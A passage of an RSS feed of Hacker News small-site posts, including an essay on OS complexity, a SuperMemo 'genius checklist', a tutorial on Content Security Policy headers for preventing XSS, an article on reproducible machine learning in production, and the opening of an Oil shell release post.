<p>People take this all for granted. But when I look around, I see many
systems that don’t need this complexity and where it is only a safety
and security burden. Consider most appliance-type products, e.g. a
Wi-Fi router. Or a system that runs one service on a cloud VM. You
know everything in advance!</p>

<p>If you read until this point, you are probably asking yourself, where
I am going with this. If you think <a href="https://en.wikipedia.org/wiki/Separation_kernel">separation
kernel</a>, you are
right. My rough plan to write a couple of more posts to flesh out the
idea of doing all the complicated OS parts at compile time and how
this results in an incredibly simple, secure, and efficient system at
runtime. There will be <a href="https://riscv.org/">RISC-V</a>,
<a href="https://www.haskell.org/">Haskell</a>, <a href="https://dhall-lang.org/">Dhall</a>,
and <a href="https://www.rust-lang.org/">Rust</a> content.</p>

<p>Stay tuned.</p>

  </div>
</article>

      </div>
    </div></div>]]>
            </description>
            <link>https://x86.lol/generic/2020/10/30/complexity-in-operating-systems.html</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949983</guid>
            <pubDate>Sat, 31 Oct 2020 09:06:01 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Genius Checklist]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949932">thread link</a>) | @rajlego
<br/>
October 31, 2020 | https://supermemo.guru/wiki/Genius_checklist | <a href="https://web.archive.org/web/*/https://supermemo.guru/wiki/Genius_checklist">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div id="mw-content-text" lang="en" dir="ltr"><p><small>This article by Dr <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> is part of <a href="https://supermemo.guru/wiki/SuperMemo_Guru" title="SuperMemo Guru">SuperMemo Guru</a> series on memory, learning, creativity, and problem solving.</small>
</p>


<p><small>Compiled on the basis of the original list presented here: <i><a href="http://super-memory.com/articles/genius.htm">Roots of genius and creativity</a></i>, <a href="https://supermemo.guru/wiki/Piotr_Wozniak" title="Piotr Wozniak">Piotr Wozniak</a> (2001)</small>
</p>
<h2><span id="How_to_become_a_genius">How to become a genius</span></h2>
<p>A majority of people carry the potential to become a genius. There are factors that are far <a href="https://supermemo.guru/wiki/Simple_formula_for_high_intelligence" title="Simple formula for high intelligence">more important than genes and IQ</a>. I have compiled a checklist that I believe should work, when followed. All you need to begin with is to be free and reasonably healthy. I try to list the factors that prevent many people from accomplishing their greatest potential. The list begins with the stumbling blocks that are most likely to occur on one's road to genius. Some factors need to be balanced against each other, and some factors overlap. For example, the first three preconditions of genius are strongly related: freedom from <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">stress</a>, <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">good sleep</a>, and <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. They may provide the key to answering why we are not (yet) a planet of geniuses. I listed individual points separately on the basis of their ability to motivate and inspire. Before you start reading, however, remember what Herbert Simon said about genius: it takes about ten years to develop it. Not only will you have to meet all the criteria listed below, but lots of hard work and patience will be required before you climb that summit!
</p>
<p>If you follow these rules religiously, you will be amazed by how much progress you can make in a decade</p> 
<p>If I scare you with a decade-long time-frame, remember that chances are good that you will love your self-transformation in weeks. The younger you are, the 'messier' your life, the less you know about your future, the more powerful the effect.
</p>
<h3><span id="Eliminate_stress">Eliminate stress</span></h3>
<p>Stress is understood here as rapid change resulting in an increase in stress hormones (catecholamines, ACTH, cortisol, etc.). Stressful change can come from conflict, illness, the death of a relative, or unemployment. Stress can also result from seemingly happy events such as a wedding or a hasty vacation. A simple test here is to make sure that creative problems circulate in your mind while you are brushing your teeth. You will fail the test if, instead of creative thinking, you are preoccupied with problems at work or in the family. Stress will dramatically cut down your creative efficiency. Most of all, it will affect your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>: another cornerstone of genius. In addition, <a href="https://supermemo.guru/wiki/Chronic_stress" title="Chronic stress">chronic stress</a> will result in excess cortisol, increased activity in the sympathetic system, and a resulting inhibition of neurogenesis, memory consolidation, creativity, and more. See: <a href="https://supermemo.guru/wiki/Stress_resilience" title="Stress resilience">Stress resilience</a>
</p>
<h3><span id="Sleep">Sleep</span></h3>
<p>Make sure to always get as much quality sleep as <a href="https://supermemo.guru/wiki/Free_running_sleep" title="Free running sleep">your brain requires</a>. The simplest first step is: <a href="https://supermemo.guru/wiki/Kill_the_alarm_clock" title="Kill the alarm clock">throw away your alarm clock</a>! Lack of sleep delivers a quadruple whammy: (1) it suppresses memory consolidation, (2) it prevents <a href="https://supermemo.guru/wiki/Memory_optimization_in_sleep" title="Memory optimization in sleep">memory optimization</a>, (3) it makes you unwilling to exert mental effort, and (4) it undermines your <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">self-discipline</a>. Submit to the <a href="https://supermemo.guru/wiki/Natural_creativity_cycle" title="Natural creativity cycle">natural creativity cycle</a>. For more see: <a href="https://supermemo.guru/wiki/Science_of_sleep" title="Science of sleep">Science of sleep</a>
</p>
<h3><span id="Self-discipline">Self-discipline</span></h3>
<p>Lack of self-discipline aggravated by stress and a lack of sleep is the number one cause of low productivity. The trick to achieving good self-discipline is to make incremental progress, and convert discipline into a habit and then into the pleasure of productivity (for more see: <a href="https://supermemo.guru/wiki/Self-discipline" title="Self-discipline">Self-discipline</a>).
If you develop healthy self-discipline habits early, your life is likely to take an entirely different course. If you believe you are lacking in this field, try the following exercise: as soon as a valuable activity comes to your mind that you are really unwilling to do, <b>do it</b>. Within the scope and in agreement with human biology, your rational brain must be the master of your decision making. Stand over a pool of cold water. Do you hate jumping in? The more you hate it, the sooner you should jump. And in the end you will <a href="https://supermemo.guru/wiki/Winter_swimming" title="Winter swimming">love it</a>. A cold shower is a minor inconvenience once you experience the volitional power of the brain. You need to master the skill of perfect execution of your own plans. The more precise your plan, the harder it is to execute, yet the more tangible the results. Learn to delay gratification. If you focus on your long-term goals, your daily inconveniences will be more bearable or even pleasurable. A strenuous quest towards the goal is the best reward for a genius mind. Minor awards of laziness do not befit a true genius. Think of self-discipline daily. Even the strongest minds can relax it all too easily. Remember about stress and sleep. Stress and sleepiness are chief factors that undermine self-discipline. Self-discipline cannot quarrel with biology. In extreme cases, it can actually <a href="https://supermemo.guru/wiki/War_of_the_networks" title="War of the networks">undermine your genius</a>. If you are sick, stop working. If you are sleepy, go to sleep. For comfort, you should know, that with each passing year, self-discipline will gradually transform into a pleasure. Not only will you <a href="https://supermemo.guru/wiki/Plan" title="Plan">execute your plans instinctively</a>, you will also reap the benefits of your earlier efforts to steer your life in a good direction. In later years, you will not need much self-discipline to employ your genius mind to do good things.
</p>
<h3><span id="Learn_day_and_night">Learn day and night</span></h3>
<p>Knowledge is the substance you <a href="https://supermemo.guru/wiki/How_to_solve_any_problem%3F" title="How to solve any problem?">convert to great ideas</a>. Although it is possible to learn in stress or in a <a href="https://supermemo.guru/wiki/Sleep_deprivation" title="Sleep deprivation">sleep deficit</a>, learning is listed here behind stress, sleep and self-discipline. This is because humans exhibit <a href="https://supermemo.guru/wiki/Learn_drive" title="Learn drive">inborn curiosity</a> that makes them crave learning. TV, tabloid press, and social media thrive on this need for learning. Most people understand the importance of learning but are prevented from executing their plans due to stress, lack of sleep or lack of self-discipline. To breed genius, your whole life should revolve around learning. You should use every single little opportunity to learn important things. This could be reading Einstein's biography or talking with a homeless person. Read, talk, watch, surf, and keep on thinking. Do not avoid hard subjects (e.g. mathematics). Mold your learning strictly to your creative needs, but do not fail to explore a wide range of topics. Touch all the bases and avoid tunnel vision! Remember that your success in learning will require appropriate <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">knowledge representation</a> and timing of review (as in <a href="https://supermemo.guru/wiki/SuperMemo" title="SuperMemo">SuperMemo</a>). Are you lacking a university education? <a href="https://supermemo.guru/wiki/School_dropouts" title="School dropouts">Never mind</a>. Look at Edison, Lincoln, or Leibnitz to see the power of <a href="https://supermemo.guru/wiki/Self-learning" title="Self-learning">self-instruction</a>. All the seemingly contradictory requirements listed above can be reconciled if you structure your learning with <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>. See: <a href="https://supermemo.guru/wiki/Advantages_of_incremental_reading" title="Advantages of incremental reading">Advantages of incremental reading</a>
</p>
<h3><span id="Abstract_knowledge">Abstract knowledge</span></h3>
<p>Except for a great deal of learning, you will need to pay attention to the <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">quality of knowledge</a> and its general <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">applicability</a>. You cannot just memorize thousands of facts. You have to consciously explore areas such as logic, probability, statistics, game theory, decision theory, computing sciences, optimization, as well as other branches of mathematics and sciences. You have to develop a love for logical thinking, the scientific method, and skepticism. Even if you are a movie critic, you will still need quality logic to frame your judgment. Remember that all knowledge is volatile and may be subject to falsification at any time. Keep your mind open to new truths even if they seem to turn your present vision of the world upside down
</p>
<h3><span id="Knowledge_representation">Knowledge representation</span></h3>
<p>The main thing that makes a genius brain stand out is its ability to store <a href="https://supermemo.guru/wiki/Coherence" title="Coherence">quality knowledge</a> in a way that is <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">easy to remember</a> and <a href="https://supermemo.guru/wiki/Applicability" title="Applicability">easy to use</a>. A genius mind can see complex things in a simple form. It looks at the same text or picture and sees a dozen times more than an average individual. An average reader will say: <i>"I understand, so what?"</i>. A genius reader will say: <i>"Eureka!"</i>, and list several applications of the just acquired piece of knowledge. Geniuses simplify while learning. They <a href="https://supermemo.guru/wiki/Generalization" title="Generalization">generalize</a>. They build <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract models</a>. They develop abstract languages for representing knowledge. Those representation skills can also be developed by training. Have you ever tried to learn Kanji (Japanese language symbols)? If you see Kanji as a tangle of confused sticks, you are a typical beginner. Over time, however, Kanji symbols should begin to sing to you and talk to you in their own language. Once you pass the first few hundred, the next thousand should go smoothly. The same happens if you learn the 20x20 multiplication table. With time you learn simple tricks for running simple and repetitive calculations. Instead of memorizing 20x20 combinations, you limit yourself to a standard 10x10 table (just 25% of all combinations) and add to this a few rules for manipulating numbers in your <a href="https://supermemo.guru/wiki/Working_memory" title="Working memory">working memory</a>. The best way to develop good representations is to (1) understand the way the memory works (see: <a href="https://supermemo.guru/wiki/20_rules" title="20 rules">20 rules of formulating knowledge</a>), (2) consciously modify representations in the learning process (e.g. <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a> supports this process naturally) (3) work on <a href="https://supermemo.guru/wiki/Abstract_knowledge" title="Abstract knowledge">abstract knowledge</a> (the more you learn the easier it becomes), and (4) get <a href="https://supermemo.guru/wiki/Good_sleep" title="Good sleep">good sleep</a> to employ <a href="https://supermemo.guru/wiki/Neural_optimization_in_sleep" title="Neural optimization in sleep">neural optimization in sleep</a>. If you encounter a difficult problem in <a href="https://supermemo.guru/wiki/Incremental_reading" title="Incremental reading">incremental reading</a>, postpone it. With luck, some other information source will present to you a better representation that is easier to assimilate.
</p>
<h3><span id="Health">Health</span></h3>
<p>Take obsessive care of your health! Keep your blood pressure down (high blood pressure damages your brain), do not <a href="https://supermemo.guru/wiki/Impact_of_alcohol_on_sleep" title="Impact of alcohol on sleep">abuse alcohol</a> (any dose that visibly affects your mental performance may be poisonous to your brain), use medication only when absolutely necessary, exercise, stay away from smoking or illicit drugs, learn medical sciences!!! Your brain is a highly sensitive organ that needs a healthy environment to operate in. Health and understanding of the biological needs of your brain may dramatically affect your performance in the long run. Don't waste time on <a href="https://supermemo.guru/wiki/Formula_for_common_cold_prevention" title="Formula for common cold prevention">colds and flu</a>
</p>
<h3><span id="Negative_emotion">Negative emotion</span></h3>
<p>Learn to control and eliminate negative emotions that blur your mind and long-term vision. The only acceptable feelings towards others should be positive, in particular …</p></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://supermemo.guru/wiki/Genius_checklist">https://supermemo.guru/wiki/Genius_checklist</a></em></p>]]>
            </description>
            <link>https://supermemo.guru/wiki/Genius_checklist</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949932</guid>
            <pubDate>Sat, 31 Oct 2020 08:47:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Content Security Policy – protect your website from XSS attacks]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949793">thread link</a>) | @tsl143
<br/>
October 31, 2020 | https://itsopensource.com/content-security-policy/ | <a href="https://web.archive.org/web/*/https://itsopensource.com/content-security-policy/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article><header><p>October 25, 2020</p></header><section><h3>Problem</h3>
<p>It’s very common while building any project we use certain third party libraries, in the case of Javascript; <code>npm packages</code>, which recursively use more packages, and eventually your code includes a huge chunk of third party code.<br>
There is nothing wrong with it, there is no point re-inventing the wheel. We include the required library, make our code work, write tests. Deploy to a staging environment, pass through automation and finally deploy to production.  </p>
<p>The problem is when a library tries to load remote content on our website. It can be an image, font, style, or even Javascript. This content bypasses all our tests, checks, and is executed directly on production. Even worse we don’t know where the content is being served from.</p>
<h3>Content Security Policy</h3>
<p>Content Security Policy (CSP) is a <a href="https://www.w3.org/TR/CSP3/">W3C specification</a> that helps to avoid <code>XSS</code> attacks. CSP enables developers to define rules for fetching the resources(images, javascript, fonts, etc.) on the client browser. Developers can define policies to allow/restrict loading any resource, restrict resources to load only from certain domains, and disallow from any other domain. For example, you can write a CSP to restrict browsers to load images only from <code>example.com</code>, any images from other domains will be not loaded and would throw errors. In addition to resources, CSP also offers control over the embeds.<br>
In the following example, the CSP forces to load images/scripts only from self domain and prevents the loading of images from other domains.</p>
<p><span>
      <a href="https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/09e48/csp1.png" target="_blank" rel="noopener">
    <span></span>
  <img alt="CSP block" title="CSP block" src="https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/fcda8/csp1.png" srcset="https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/12f09/csp1.png 148w,
https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/e4a3f/csp1.png 295w,
https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/fcda8/csp1.png 590w,
https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/efc66/csp1.png 885w,
https://itsopensource.com/static/f79845e666a27a2b69fb967dbc09c072/09e48/csp1.png 974w" sizes="(max-width: 590px) 100vw, 590px" loading="lazy">
  </a>
    </span></p>
<p><em>From the <a href="https://www.w3.org/TR/CSP3/">W3c specification</a> docs:</em> </p>
<blockquote>
<p>One of the CSP goal is to mitigate the risk of content-injection attacks by giving developers fairly granular control over</p>
<ul>
<li>The resources which can be requested (and subsequently embedded or executed) on behalf of a specific Document or Worker</li>
<li>The execution of inline script</li>
<li>Dynamic code execution (via eval() and similar constructs)</li>
<li>The application of inline style</li>
</ul>
</blockquote>
<h3>How</h3>
<p>CSP can be implemented in following two ways:</p>
<ol>
<li>
<p>Specify in <strong>HTTP headers</strong> </p>
<div data-language="text"><pre><code>Content-Security-Policy: __Policy__</code></pre></div>
</li>
<li>
<p>Specify in <strong>META tags</strong> </p>
<div data-language="html"><pre><code><span><span><span>&lt;</span>meta</span> <span>http-equiv</span><span><span>=</span><span>"</span>Content-Security-Policy<span>"</span></span> <span>content</span><span><span>=</span><span>"</span> __Policy__ <span>"</span></span><span>&gt;</span></span></code></pre></div>
</li>
</ol>
<h4>Defining a policy</h4>
<p>The Policy is the accumulation of directives which defines the allowed location of each resource, no directive means allowed for all. Some of the useful directives are the following:</p>
<ul>
<li><em>default-src</em> : This defines the loading policy for all types of resources.</li>
<li><em>script-src</em> : This defines the loading policy for all javascript, from where javascript can be loaded.</li>
<li><em>img-src</em> : This defines the loading policy for all images, from where images can be loaded. </li>
</ul>
<p>List of directives for the other resources is <a href="https://developers.google.com/web/fundamentals/security/csp#policy_applies_to_a_wide_variety_of_resources">here</a>.</p>
<p>Some examples of policies are:</p>
<ol>
<li>
<div data-language="text"><pre><code>Content-Security-Policy: default-src 'self';</code></pre></div>
<p>This would allow resources only from the same domain, and all other resources will fail to load.</p>
</li>
<li>
<div data-language="text"><pre><code>Content-Security-Policy: img-src example.com;</code></pre></div>
<p>This would allow images only from <code>example.com</code>, and all other images will fail to load.</p>
</li>
<li>
<div data-language="text"><pre><code>Content-Security-Policy: default-src 'self'; img-src example.com;</code></pre></div>
<p>This would allow any resources to load only if from the same domain, except images which can be from <code>example.com</code> too.</p>
</li>
</ol>
<h4>Reporting</h4>
<p>CSP also provides a way to send violation reports, in case any logging is required, via <code>report-uri</code> directive. </p>
<div data-language="text"><pre><code>`Content-Security-Policy: default-src 'self'; report-uri http://example.com/cspfails` </code></pre></div>
<p>The reports will be sent as POST request and with following JSON: </p>
<div data-language="json"><pre><code><span>{</span>
 <span>"csp-report"</span><span>:</span> <span>{</span>
   <span>"document-uri"</span><span>:</span> <span>"http://example.com/"</span><span>,</span>
   <span>"referrer"</span><span>:</span> <span>""</span><span>,</span>
   <span>"blocked-uri"</span><span>:</span> <span>"http://example.com/some_malware.js"</span><span>,</span>
   <span>"violated-directive"</span><span>:</span> <span>"default-src self"</span><span>,</span>
   <span>"original-policy"</span><span>:</span> <span>"default-src 'self'; report-uri http://example.com/cspfails"</span>
 <span>}</span>
<span>}</span></code></pre></div>
<br>
<h3>Risks</h3>
<p>Before defining a CSP you should be completely aware of all the resources and respective origin required for your webapp, else some vital resources may be blocked and eventually random bugs.
In case you are not sure what all resources are being required for running your web page smoothly, you can implement the CSP in reporting mode, in this way the violations will be reported but no resource will be blocked, once you are sure what are the resources really required, you can implement CSP. To do this instead of <code>Content-Security-Policy</code> we need to use <code>Content-Security-Policy-Report-Only</code> header. </p>
<div data-language="text"><pre><code>Content-Security-Policy-Report-Only: __Policy__ + report-uri</code></pre></div>
<h3>Resources</h3>
<ul>
<li><a href="https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP">https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP</a></li>
<li><a href="https://owasp.org/www-community/attacks/Content_Security_Policy">https://owasp.org/www-community/attacks/Content_Security_Policy</a></li>
</ul></section><hr></article></div>]]>
            </description>
            <link>https://itsopensource.com/content-security-policy/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949793</guid>
            <pubDate>Sat, 31 Oct 2020 07:55:08 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[The 12 Factors of reproducible Machine Learning in production]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949736">thread link</a>) | @benkoller
<br/>
October 31, 2020 | https://blog.maiot.io/12-factors-of-ml-in-production/ | <a href="https://web.archive.org/web/*/https://blog.maiot.io/12-factors-of-ml-in-production/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="post-content">
    <div id="blogpost">
        <p>The last two decades have yielded us some great understandings about Software Development. A big part of that is due to the emergence of DevOps and itâ€™s wide adoption throughout the industry.</p>

<p>Leading software companies follow identical patterns: Fast iterations in software development followed by Continuous Integration, Continuous Delivery, Continuous Deployment. Every artefact is tested on its ability to provide value, always has a state of readiness and is deployed through automation.</p>

<p>As a field, Machine Learning differs from traditional software development, but we can still borrow many learnings and adapt them to â€œourâ€� industry. For the last few years, weâ€™ve been doing Machine Learning projects in production, so beyond proof-of-concepts, and our goals where the same is in software development: reproducibility. So we built a pipeline orchestrator, strong automations and established a workflow to achieve exactly that.</p>

<p>Why not just Jupyter Notebooks? Well, how long does it take to construct a Notebook from scratch, with all processing steps, from scratch? And how easy is it to onboard new members to the team? Can you reproduce the results youâ€™ve had two months ago, now, fast? Can you compare todayâ€™s results against historic oneâ€™s? Can you give provenance over your data throughout training? And what happens if your model goes stale?</p>

<p>Weâ€™ve faced all of these issues, and more, and now took our experience to deduce 12 factors (as a nod to the <a href="https://12factor.net/">12 factor app</a>) that build the backbone of successful ML in production.</p>

<h2 id="1-versioning">1. Versioning</h2>

<p>While obvious to basically all Software Engineers, version control is not an universally accepted methodology among Data Scientists. Let me quote the folks at Gitlab as a quick primer:</p>

<blockquote>
  <p>Version control facilitates coordination, sharing, and collaboration across the entire software development team. Version control software enables teams to work in distributed and asynchronous environments, manage changes and versions of code and artifacts, and resolve merge conflicts and related anomalies.</p>
</blockquote>

<p>In short, versioning lets you safely manage the moving parts of Software Development.</p>

<p>As a special form of Software Development, Machine Learning has unique requirements. First, it has not one but two moving parts: Code and Data. Second, model trainings happen in (fast) iterations and introduce a high variance of code (e.g. splitting, preprocessing, models).</p>

<p>As soon as data can be subject to change it needs to be versioned to be able to reproducibly and repeatably conduct experiments and train models. Cruder forms of versioning (read: hard-copies) can go a long way, but especially in team scenarios shared, immutable version control becomes critical.</p>

<p>Version control of code is even more key. In addition to aboveâ€™s quote, preprocessing code is not just relevant at training but also at serving time and needs to be immutably correlatable with models. Serverless functions can provide an easy-access way to achieve a middle ground between the workflow of Data Scientists and production-ready requirements.</p>

<p><strong>TL;DR:</strong> You need to version your code, and you need to version your data.</p>

<h2 id="2-explicit-feature-dependencies">2. Explicit feature dependencies</h2>

<p>In a perfect world, whatever produces your input data will forever produce exactly the same data, at least structurally. But the world is not perfect, youâ€™re consuming data from an upstream service thatâ€™s built by humans and might be subject to change. Features will change, eventually. At best, your models fail outright, but at worst theyâ€™ll just silently start to produce garbage results.</p>

<p>Explicitly defined feature dependencies allow for transparent failure as early as possible. Well-designed systems will accommodate feature dependencies both in continuous training as well as at serving time.</p>

<p><strong>TL;DR:</strong> Make your feature dependencies explicit in your code.</p>

<h2 id="3-descriptive-training-and-preprocessing">3. Descriptive training and preprocessing</h2>

<p>Good software is descriptive - it can be read and understood easily without reading every line of code.</p>

<p>And while Machine Learning is a unique flavor of Software Development it doesnâ€™t exempt practitioners from following established coding guidelines. Basic understanding of coding standard essentials can be picked up with very little effort and in a short amount of time.</p>

<p>Code for both preprocessing and models should follow <a href="https://www.python.org/dev/peps/pep-0008/">PEP8</a>. It should consist of meaningful object names and contain helpful comments. Following PEP8 will improve code legibility, reduce complexity and speed up debugging. Programming paradigms such as <a href="https://en.wikipedia.org/wiki/SOLID">SOLID</a> provide thought frameworks to make code more maintainable, understandable and flexible for future use cases.</p>

<p>Configuration should be separated from code. Donâ€™t hardcode your split ratios, provide them at runtime through configuration. As known from hyperparameter tuning, a well-separated configuration increases speed of iterations significantly and makes codebases reusable.</p>

<p><strong>TL;DR:</strong> Write readable code and separate code from configuration.</p>

<h2 id="4-reproducibility-of-trainings">4. Reproducibility of trainings</h2>

<p>If you canâ€™t reproduce training results you canâ€™t trust the results. While this is somewhat the overarching theme of this blogpost, there are nuances to reproducibility. Not just do you need to be able to reproduce a training yourself, the entire team should be able to do so. Obscuring trainings in Jupyter Notebooks on someones PC or on some VM on AWS is the literal inverse of a reproducible training.</p>

<p>By using pipelines to train models entire teams gain both access and transparency over conducted experiments and training runs. Bundled with a reusable codebase and a separation from configuration, everyone can successfully relaunch any training at any point in time.</p>

<p><strong>TL;DR:</strong> Use pipelines and automation.</p>

<h2 id="5-testing">5. Testing</h2>

<p>Testing comes in many shapes and forms. To give two examples:</p>

<ul>
  <li><a href="https://en.wikipedia.org/wiki/Unit_testing">Unit testing</a> is testing on an atomic level - every function is tested individually on itâ€™s own specific criteria.</li>
  <li><a href="https://en.wikipedia.org/wiki/Integration_testing">Integration testing</a> is taking an inverse approach - all elements of a codebase are tested as a group, in conjunction and with clones/mocks of up- and downstream services.</li>
</ul>

<p>Both paradigms are good starting points for Machine Learning. Preprocessing code is predestined for unit testing - do transforms yield the right results given various inputs? Models are a great use case for integration tests - does your model produce comparable results to evaluation at serving time in a production environment?</p>

<p><strong>TL;DR:</strong> Test your code, test your models.</p>

<h2 id="6-drift--continuous-training">6. Drift / Continuous training</h2>

<p>Drift is a legit problem for production scenarios. You need to account for drift as soon as there is even a slight possibility that data might change (e.g. user input, upstream service volatility). Two measures can mitigate risk exposure:</p>

<ul>
  <li>Data monitoring for production systems. Establish automated reporting mechanisms to alert teams of changing data, even beyond explicitly defined feature dependencies.</li>
  <li>Continuous training on newly incoming data. Well-automated pipelines can be rerun on newly recorded data and offer comparability to historic training results to show performance degradation as well as offer a quick way to promote newly trained models into production, given better model performance.</li>
</ul>

<p><strong>TL;DR:</strong> If you data can change run a continuous training pipeline.</p>

<h2 id="7-tracking-of-results">7. Tracking of results</h2>

<p>Excel is not a good way to track experiment results. And not just Excel, any decentralized, manual form of tracking will yield non-authoritative and therefore untrustworthy information.</p>

<p>The right approach are automated methods to record training results in a centralized data store. Automation ensures the reliable tracking of every training run, and allows for a later comparability of training runs against each other. Centralized storage of results give transparency across teams and allows for continuous analysis.</p>

<p><strong>TL;DR:</strong> Track results via automation.</p>

<h2 id="8-experimentation-vs-production-models">8. Experimentation vs Production models</h2>

<p>Understanding datasets requires effort. Commonly, this understanding is gathered through experimentation, especially when operating in fields with a lot of hidden domain knowledge. Start a Jupyter Notebook, get some/all of the data into a Pandas Dataframe, do some hours of out-of-sequence magic, train a first model, evaluate results - Job done. Well, unfortunately not.</p>

<p>Experiments serve a purpose in the lifecycle of Machine Learning. The results of these Experiments are however not models, but understanding. Models from explorative Jupyter Notebooks are proof for understanding, not production-ready artefacts. Gained understanding will need more molding and fitting into production-ready training pipelines.</p>

<p>All understandings unrelated to domain-specific knowledge can however be automated. Generate statistics on each data version youâ€™re using to skip any one-time, ad-hoc exploratory work you might have had to do in Jupyter Notebooks, and move straight to the first pipelines. The earlier you experiment in pipelines, the earlier you can collaborate on intermediate results and the earlier youâ€™ll receive production-ready models.</p>

<p><strong>TL;DR:</strong> Notebooks are not production-ready, so experiment in pipelines early on.</p>

<h2 id="9-training-serving-skew">9. Training-Serving-Skew</h2>

<p>The avoidance of skewed training and serving environments is often reduced to correctly embedding all data preprocessing into the model serving environments. This is absolutely correct, and you need to adhere to this rule. However, it is also a too narrow interpretation of Training-Serving-Skew.</p>

<p>A little detour to ancient DevOps history: In 2006 the CTO of Amazon, Werner Vogels, coined the term â€œYou build it, you run itâ€�. Itâ€™s a descriptive phrase for extending the responsibility of Developers to not only writing but also running the software they build.</p>

<p>A similar dynamic is required for Machine Learning projects - an understanding of both the upstream generation of data and the downstream usage of generated Models is within the responsibility of Data Scientists. What system generates your data for …</p></div></section></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://blog.maiot.io/12-factors-of-ml-in-production/">https://blog.maiot.io/12-factors-of-ml-in-production/</a></em></p>]]>
            </description>
            <link>https://blog.maiot.io/12-factors-of-ml-in-production/</link>
            <guid isPermaLink="false">hacker-news-small-sites-24949736</guid>
            <pubDate>Sat, 31 Oct 2020 07:38:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Big Changes to the Oil Language]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=24949731">thread link</a>) | @todsacerdoti
<br/>
October 31, 2020 | http://www.oilshell.org/blog/2020/10/big-changes.html | <a href="https://web.archive.org/web/*/http://www.oilshell.org/blog/2020/10/big-changes.html">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">
  <!-- INSERT LATCH HTML -->
<p><a href="http://www.oilshell.org/blog/">blog</a> | <a href="http://www.oilshell.org/">oilshell.org</a></p>

<p>
  2020-10-31
</p>
<p>I recently released <a href="https://www.oilshell.org/release/0.8.3/">Oil 0.8.3</a>, and it's the biggest release in
recent memory!  What's new?</p>
<ul>
<li>Many changes to the <a href="http://www.oilshell.org/cross-ref.html?tag=oil-language#oil-language">Oil expression language</a>, including
Python compatibility and legacy syntax removal.</li>
<li>Changes to the <strong>word</strong> syntax, e.g. the <code>@</code> sigil.</li>
<li>Keyword changes, like the removal of <code>pass</code>.</li>
<li>New <strong>functions</strong>, like <code>_match()</code> to access <a href="http://www.oilshell.org/cross-ref.html?tag=eggex#eggex">eggex</a> matches.</li>
<li>Enhancements to <a href="http://www.oilshell.org/cross-ref.html?tag=shell-builtin#shell-builtin">shell builtins</a>, including <a href="http://www.oilshell.org/cross-ref.html?tag=QSN#QSN">QSN</a>
support in <code>read</code> and <code>write</code>.</li>
<li>The comprehensive <code>errexit</code> overhaul, <a href="http://www.oilshell.org/blog/2020/10/osh-features.html#reliable-error-handling">mentioned in the last
post</a>.</li>
<li>Many new docs</li>
</ul>
<p>This is the first of two posts that describe the language changes.  Separately,
I plan to write "the ultimate guide" to error handling in shell.</p>
<p>If you're not familiar with Oil, see the <strong>new</strong> <a href="http://www.oilshell.org/release/latest/doc/language-influences.html">Language
Influences</a> and  <a href="http://www.oilshell.org/release/latest/doc/idioms.html">Oil Language
Idioms</a> docs, as well as posts tagged
#<a href="http://www.oilshell.org/blog/tags.html?tag=oil-language#oil-language">oil-language</a>.</p>
 
<a name="help-wanted"></a>
<h2>Help Wanted</h2>
<p>If you're interested in Oil, now is a great time to get involved.  Recall that
the <a href="http://www.oilshell.org/blog/2020/10/osh-features.html">last post</a> said that OSH would have four significant
fixes, but the rest of the project was too much work.  <strong>The work described
here is what I need help with</strong>!</p>
<p>Toward the end, I recently updated these pages:</p>
<ul>
<li><a href="https://github.com/oilshell/oil#important-we-accept-small-contributions">We Accept Small Contributions</a></li>
<li><a href="https://github.com/oilshell/oil/wiki/Contributing">Contributing</a></li>
</ul>
<p>Asking questions and leaving feedback about the language on
<a href="http://www.oilshell.org/cross-ref.html?tag=zulip#zulip">Zulip</a> is also appreciated!  Several people have influenced the
language design this way.</p>
<a name="operators-expression-mode"></a>
<h2>Operators (Expression Mode)</h2>
<p>The expression language lets you talk about typed data with operators and
literals.  Let's review those changes first.</p>
